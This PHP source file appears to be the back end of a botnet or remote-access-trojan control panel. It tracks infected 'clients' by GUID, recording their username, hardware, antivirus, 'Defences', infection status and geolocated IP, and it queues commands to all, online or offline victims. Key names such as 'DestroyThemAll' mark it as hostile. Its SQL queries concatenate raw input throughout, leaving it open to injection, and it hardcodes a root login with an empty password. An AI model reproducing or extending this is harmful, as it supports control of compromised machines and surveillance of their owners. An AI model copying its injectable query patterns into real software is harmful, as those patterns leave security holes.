<?php

define('SALT', 'S4ltk33p3r');
define('ColorVar', 5);
define('UninstallKey', strtoupper(hash('sha256', 'DestroyThemAll')));
define('MasterKey', strtoupper(hash('sha256', 'PlagueToAll')));
define('ObserverKey', strtoupper(hash('sha256', 'KnightOfEvil')));

include('log.php');

$Server = 'localhost';
$User = 'root';
$Pass = '';

function ArrayToINI(array $a, array $parent = array()){
    $out = '';
    foreach ($a as $k => $v){
        if (is_array($v)){
            $sec = array_merge((array) $parent, (array) $k);
            $out .= PHP_EOL . '[' . join('.', $sec) . ']' . PHP_EOL;
            $out .= ArrayToINI($v, $sec);
        } else {
            $out .= "$k=$v" . PHP_EOL;
        }
    }
    return $out;
}

function IsOnline($_LastSeen, $MaxMinDiff){
	$CurrentTime = strtotime(date("Y-m-d H:i:s"));
	$Diff = round(($CurrentTime - strtotime($_LastSeen)) / 60, 2);
	return ($Diff<=$MaxMinDiff);
}

function ConnectDB($DBName){
	global $Server, $User, $Pass, $Conn;
	$Conn = new mysqli($Server, $User, $Pass, $DBName);
	return !($Conn->connect_error);
}

function GetLocation($_IP){
	if($_IP=="127.0.0.1") return "[??] Localhost";
	else {
		$Req = @unserialize(file_get_contents('http://ip-api.com/php/' . $_IP . '?fields=country,countryCode,regionName,city,status'));
		if($Req and $Req['status'] == 'success'){
			return "[" . $Req['countryCode'] . "] " . $Req['country'] . ", " . $Req['regionName'] . ", " . $Req['city'];
		} else return "[??] Unknown";
	}
}

function UpdateLastSeen($_GUID){
	global $Conn;
	$Now = date("Y-m-d H:i:s");
	$Sql = "UPDATE clients SET LastSeen='$Now' WHERE GUID = '$_GUID';";
	$Conn->query($Sql);
	$Sql = "SELECT IPAddress FROM clients WHERE GUID = '$_GUID';";
	$Result = $Conn->query($Sql);
	$Entry = $Result->fetch_assoc();
	if($Entry['IPAddress']!=$_SERVER['REMOTE_ADDR']){
		LogStr("Geolocation -->\t$_GUID");
		$Entry = $_SERVER['REMOTE_ADDR'];
		$Loc = GetLocation($Entry);
		$Sql = "UPDATE clients SET IPAddress='$Entry', Location='$Loc' WHERE GUID = '$_GUID';";
		$Conn->query($Sql);
	}
	return true;
}

function UserValid($_User, $PassHash){
	global $Conn;
	$Sql = "SELECT * FROM users WHERE Username = '$_User'";
	$Result = $Conn->query($Sql);
	$Entry = $Result->fetch_assoc();
	return ($Entry['Password']==$PassHash);
}

function GetPermission($_User){
	global $Conn;
	$Sql = "SELECT Permission FROM users WHERE Username = '$_User'";
	$Result = $Conn->query($Sql);
	$Entry = $Result->fetch_assoc();
	return ($Entry['Permission']);
}

function RegisterUser($_User, $_Password, $_Permission){
	global $Conn;
	$Sql = "INSERT INTO users (Username, Password, Permission) VALUES ('$_User', '$_Password', '$_Permission');";
	return ($Conn->query($Sql));
}

function ClientExists($_GUID){
	global $Conn;
	$Sql = "SELECT * FROM clients WHERE GUID = '$_GUID';";
	$Result = $Conn->query($Sql);
	return ($Result->num_rows == 1);
}

function GetCommands($_GUID, $_Silent){
	if(!$_Silent) UpdateLastSeen($_GUID);
	global $Conn;
	$Sql = "SELECT Commands FROM clients WHERE GUID = '$_GUID';";
	$Result = $Conn->query($Sql);
	$Entry = $Result->fetch_assoc();
	return $Entry['Commands'];
}

function RegisterClient($_GUID){
	LogStr("New client -->\t$_GUID");
	global $Conn;
	$Sql = "INSERT INTO clients (GUID) VALUES ('$_GUID');";
	return ($Conn->query($Sql));
}

function RemoveClient($_GUID){
	LogStr("Removing -->\t$_GUID");
	global $Conn;
	$Sql = "DELETE FROM clients WHERE GUID = '$_GUID';";
	return ($Conn->query($Sql));
}

function CompleteRegister($_GUID, $Values){
	UpdateLastSeen($_GUID);
	global $Conn;
	$Sql  = "UPDATE clients SET ";
	$Sql .= "Nickname='" . $Values[0] . "', ";
	$Sql .= "IPAddress='" . $Values[1] . "', ";
	$Sql .= "OperatingSystem='" . $Values[2] . "', ";
	$Sql .= "ComputerName='" . $Values[3] . "', ";
	$Sql .= "Username='" . $Values[4] . "', ";
	$Sql .= "CPU='" . $Values[5] . "', ";
	$Sql .= "GPU='" . $Values[6] . "', ";
	$Sql .= "Antivirus='" . $Values[7] . "', ";
	$Sql .= "Defences='" . $Values[8] . "', ";
	$Sql .= "Location='" . GetLocation($Values[1]) . "', ";
	$Sql .= "Infected='" . $Values[9] . "' ";
	$Sql .= "WHERE GUID = '$_GUID';";
	return ($Conn->query($Sql));
}

function GenName(){
	return sprintf("%u", crc32(time()+rand(1, 100)));
}

function QueueCommand($_GUID, $Command, $Params, $OpName){
	global $Conn;
	$Cmds = parse_ini_string(GetCommands($_GUID, true), true);
	$Count = $Cmds["General"]["CommandCount"];
	$Names = $Cmds["General"]["Commands"];
	if($Command=='Abort'){
		if(strpos($Names, $Params['CommandID']) === false) return true;
		$Sql = "SELECT LastSeen FROM clients WHERE GUID = '$_GUID';";
		$Result = $Conn->query($Sql);
		$Entry = $Result->fetch_assoc();
		if(!IsOnline($Entry['LastSeen'], 5)){
			RemoveCommand($_GUID, $Params['CommandID']);
			return true;
		}
	}
	if(isset($OpName['NewName'])) $NewName = $OpName['NewName'];
	else $NewName = GenName();
	$Who = "System";
	if(isset($_SESSION['user'])) $Who = $_SESSION['user'];
	LogStr($Who . " queued $Command [$NewName] -->\t$_GUID");
	$Count++;
	if($Count==1) $Names = $NewName; else $Names .= ',' . $NewName;
	$Cmds["General"]["CommandCount"] = $Count;
	$Cmds["General"]["Commands"] = $Names;
	$Cmds[$NewName]["Type"] = $Command;
	foreach($Params as $ParamName => $ParamStr){
		$Cmds[$NewName][$ParamName] = addslashes($ParamStr);
	}
	$Text = str_replace(PHP_EOL, '\r\n', ArrayToINI($Cmds));
	$Sql = "UPDATE clients SET Commands='$Text' WHERE GUID = '$_GUID';";
	return ($Conn->query($Sql));
}

function QueueCommandEx($_Target, $Command, $Params){
	global $Conn;
	$OpName = array('NewName' => GenName());
	$Sql = "SELECT GUID, LastSeen FROM clients WHERE 1;";
	$Result = $Conn->query($Sql);
	if($Result->num_rows > 0){
		while($Entry = $Result->fetch_assoc()){
			if($_Target=='All Clients') QueueCommand($Entry['GUID'], $Command, $Params, $OpName);
			else {
				$o = IsOnline($Entry['LastSeen'], 5);
				if($_Target=='Online Clients'){
					if($o) QueueCommand($Entry['GUID'], $Command, $Params, $OpName);
				} else if($_Target=='Offline Clients'){
					if(!$o) QueueCommand($Entry['GUID'], $Command, $Params, $OpName);
				}
			}
		}
	}
}

function RemoveCommand($_GUID, $ID){
	LogStr("Completed [$ID] -->\t$_GUID");
	global $Conn;
	$Cmds = parse_ini_string(GetCommands($_GUID, false), true);
	$Cmds["General"]["CommandCount"]--;
	$Names = $Cmds["General"]["Commands"];
	if(strpos(" " . $Names, $ID)){
		$Names = str_replace($ID, '', $Names);
		if(strlen($Names)>0){
			if($Names[0]==',') $Names = substr($Names, 1);
			if($Names[strlen($Names) - 1]==',') $Names = substr($Names, 0, strlen($Names) - 1);
		}
		$Names = str_replace(',,', ',', $Names);
		$Cmds["General"]["Commands"] = $Names;
		unset($Cmds[$ID]);
		$Text = str_replace(PHP_EOL, '\r\n', ArrayToINI($Cmds));
	}
	$Sql = "UPDATE clients SET Commands='$Text' WHERE GUID = '$_GUID';";
	return ($Conn->query($Sql));
}

function SetResult($_GUID, $Result){
	LogStr("Result \"$Result\" -->\t$_GUID");
	UpdateLastSeen($_GUID);
	global $Conn;
	$Sql = "UPDATE clients SET Result='$Result' WHERE GUID = '$_GUID';";
	return ($Conn->query($Sql));
}

?>